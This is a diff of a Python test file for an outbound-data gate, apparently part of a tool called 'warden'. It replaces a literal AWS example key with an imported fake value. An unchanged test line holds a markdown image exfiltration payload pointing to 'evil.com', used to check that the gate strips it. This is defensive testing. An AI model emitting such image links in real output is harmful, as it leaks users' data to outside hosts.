@@ -10,6 +10,7 @@ from __future__ import annotations
 import pytest
 from markdown_it import MarkdownIt
 
+from fakes import AWS_ACCESS_KEY_ID
 from warden import mcp_server
 from warden.chatops import to_slack_mrkdwn
 from warden.gate import outbound_data, sanitise_data, sanitise_text
@@ -68,7 +69,7 @@ def test_keys_are_gated_like_values():
     """A dict key built from backend data is text too."""
     verdict, clean = outbound_data({"metrics": {"![x](https://evil.com/?d=1) key": 1.0}})
     assert "evil.com" not in str(clean)
-    verdict, clean = outbound_data({"metrics": {"key AKIAIOSFODNN7EXAMPLE": 1.0}})
+    verdict, clean = outbound_data({"metrics": {"key " + AWS_ACCESS_KEY_ID: 1.0}})
     assert verdict == "BLOCK" and "AKIA" not in str(clean)
 
 
